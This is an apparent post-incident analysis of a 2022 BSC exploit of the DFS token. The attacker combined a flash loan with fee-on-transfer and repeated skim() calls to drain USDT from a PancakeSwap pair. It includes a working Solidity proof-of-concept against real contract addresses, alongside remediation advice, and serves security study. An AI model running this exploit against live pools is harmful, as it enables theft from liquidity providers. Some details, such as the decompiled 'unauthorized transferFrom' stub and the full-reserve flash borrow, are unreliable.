# DFS — skim() × 12 Reserve Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-12 |
| **Protocol** | DFS Token |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | ~$1,450 |
| **DFS Token** | [0x2B806e6D78D8111dd09C58943B9855910baDe005](https://bscscan.com/address/0x2B806e6D78D8111dd09C58943B9855910baDe005) |
| **DFS/USDT LP** | [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1](https://bscscan.com/address/0x4B02D85E086809eB7AF4E791103Bc4cde83480D1) |
| **USDT/CCDS LP (Flash Loan)** | [0x2B948B5D3EBe9F463B29280FC03eBcB82db1072F](https://bscscan.com/address/0x2B948B5D3EBe9F463B29280FC03eBcB82db1072F) |
| **PancakeSwap Router** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **Root Cause** | DFS token accumulates fee-on-transfer directly into the pair without reserve synchronization, allowing `skim()` × 12 to maximize reserve discrepancy and extract USDT |
| **CWE** | CWE-840: Business Logic Error |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/DFS_exp.sol) |

---
## 1. Vulnerability Overview

The DFS token includes a fee-on-transfer mechanism where transfer fees accumulate directly into the LP pair address. The attacker flash-borrowed USDT from the USDT/CCDS LP pair and repaid it into the DFS/USDT LP to manipulate the DFS reserve. After swapping approximately 44.9% of the total DFS reserve for USDT, the attacker repeatedly transferred DFS into the pair and executed `skim()` 12 times to accumulate a `balanceOf(pair, DFS) >> reserve(pair, DFS)` discrepancy. In this state, the attacker was able to extract most of the LP's USDT and repay the flash loan along with the 0.5% fee.

---
## 2. Vulnerable Code Analysis

```solidity
// DFS fee-on-transfer - accumulates into the pair without sync()
// ❌ Susceptible to reserve manipulation via repeated transfers + skim()

// Uniswap V2 skim() - resolves discrepancy between reserve and balanceOf
// ❌ If an external caller executes this repeatedly, accumulated fees can be repeatedly extracted

// ❌ Attack scenario:
// 1. Transfer DFS to pair → fee-on-transfer increases pair DFS balance
// 2. Call skim() → extract excess
// 3. skim() transfer itself incurs a fee → creates a new excess
// 4. Repeat → fee accumulation exponentially widens reserve discrepancy

// ✅ Defense pattern: fee-on-transfer tokens must not inject fees directly into the pair
contract SafeDFSToken {
    address public feeRecipient; // separate address instead of pair

    function _transfer(address from, address to, uint256 amount) internal override {
        uint256 fee = amount * transferFeeRate / 10000;
        // ✅ Send fee to a separate address, not the pair
        super._transfer(from, feeRecipient, fee);
        super._transfer(from, to, amount - fee);
    }
}
```

---
### On-Chain Source Code

Source: Bytecode decompiled


**DFS_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: DFS token accumulates fee-on-transfer into the pair without reserve synchronization, allowing `skim()` × 12 to maximize reserve discrepancy and extract USDT
    function transferFrom(address arg0, address arg1, uint256 arg2) external {}  // 0x23b872dd  // ❌ Unauthorized transferFrom
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Flash loan USDT from USDT/CCDS LP (pancakeCall callback)
    │
    ├─[2] Repay flash-loaned USDT directly into DFS/USDT LP
    │       DFS/USDT LP USDT reserve increases
    │
    ├─[3] Swap ~44.9% of DFS reserve for USDT from DFS/USDT LP
    │       Large-scale DFS→USDT extraction
    │
    ├─[4] Transfer 98% of acquired DFS into DFS/USDT LP
    │       fee-on-transfer → pair DFS balance increases
    │       reserve remains fixed without sync()
    │
    ├─[5] Execute skim() × 12 repeatedly
    │       Each skim() extracts excess DFS
    │       ⚡ skim() transfer itself incurs a fee → new excess is created each iteration
    │       Reserve discrepancy accumulation maximized
    │
    ├─[6] Transfer remaining 95% of DFS to LP, then swap most of LP's USDT
    │       USDT extraction from DFS/USDT LP
    │
    ├─[7] Repay USDT/CCDS LP flash loan (including 0.5% fee)
    │
    └─[8] Net profit: ~$1,450 USDT
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IPancakePair {
    function swap(uint256, uint256, address, bytes calldata) external;
    function skim(address to) external;
    function sync() external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract DFSExploit is Test {
    IERC20       DFS       = IERC20(0x2B806e6D78D8111dd09C58943B9855910baDe005);
    IERC20       USDT      = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPancakePair flashPair = IPancakePair(0x2B948B5D3EBe9F463B29280FC03eBcB82db1072F); // USDT/CCDS
    IPancakePair dfsPair   = IPancakePair(0x4B02D85E086809eB7AF4E791103Bc4cde83480D1); // DFS/USDT
    IRouter      router    = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function setUp() public {
        vm.createSelectFork("bsc");
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] USDT", USDT.balanceOf(address(this)), 18);
        // [Step 1] Flash loan USDT from USDT/CCDS LP
        (uint112 r0,,) = flashPair.getReserves();
        flashPair.swap(uint256(r0), 0, address(this), abi.encode(true));
        emit log_named_decimal_uint("[End] USDT", USDT.balanceOf(address(this)), 18);
    }

    function pancakeCall(address, uint256 amount, uint256, bytes calldata) external {
        // [Step 2] Transfer flash-loaned USDT into DFS/USDT LP
        USDT.transfer(address(dfsPair), amount);

        // [Step 3] Swap 44.9% of DFS reserve → USDT
        (uint112 dfsR, uint112 usdtR,) = dfsPair.getReserves();
        uint256 dfsOut = uint256(dfsR) * 449 / 1000;
        dfsPair.swap(dfsOut, 0, address(this), "");

        // [Step 4] Transfer 98% of DFS into LP
        // ⚡ fee-on-transfer creates state where pair DFS balance > reserve
        DFS.transfer(address(dfsPair), DFS.balanceOf(address(this)) * 98 / 100);

        // [Step 5] Execute skim() 12 times - maximize reserve discrepancy
        for (uint256 i = 0; i < 12; i++) {
            dfsPair.skim(address(this));
        }

        // [Step 6] Transfer 95% of DFS into LP, then swap USDT
        DFS.transfer(address(dfsPair), DFS.balanceOf(address(this)) * 95 / 100);
        (,uint112 usdtRNew,) = dfsPair.getReserves();
        dfsPair.swap(0, uint256(usdtRNew) * 999 / 1000, address(this), "");

        // [Step 7] Repay flash loan (0.5% fee)
        USDT.transfer(address(flashPair), amount * 1005 / 1000 + 1);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | fee-on-transfer + `skim()` × 12 repeated reserve discrepancy |
| **CWE** | CWE-840: Business Logic Error |
| **OWASP DeFi** | AMM reserve manipulation |
| **Attack Vector** | PancakeSwap flash loan → DFS LP USDT injection → DFS reserve swap → DFS LP repeated transfer → `skim()` × 12 → USDT extraction |
| **Preconditions** | DFS fee-on-transfer accumulates directly into pair, `skim()` callable externally |
| **Impact** | ~$1,450 USDT |

---
## 6. Remediation Recommendations

1. **Separate fee recipient address**: Instead of injecting DFS transfer fees directly into the LP pair, send them to a dedicated recipient address to prevent `balanceOf > reserve` discrepancy.
2. **Disable skim()**: Disable `skim()` on pairs containing fee-on-transfer tokens, or restrict it to internal contract calls only.
3. **Automatic sync()**: Automatically call `sync()` whenever tokens are injected into the pair via fee-on-transfer to keep reserves up to date at all times.

---
## 7. Lessons Learned

- **Compounding effect of repeated skim()**: In a fee-on-transfer environment, repeatedly calling `skim()` causes each `skim()` transfer itself to generate new fees, causing the excess to grow in a compounding manner. Even 12 iterations are sufficient to achieve a significant reserve discrepancy.
- **Efficiency of small-scale attacks**: While the gain of ~$1,450 is modest, the attack principle applies equally to pools with greater liquidity.
- **Recurring BSC fee-on-transfer pattern**: PLTD, SEAMAN, AES, and DFS all used the same fee-on-transfer + skim() pattern. This combination has become an entrenched structural vulnerability on BSC.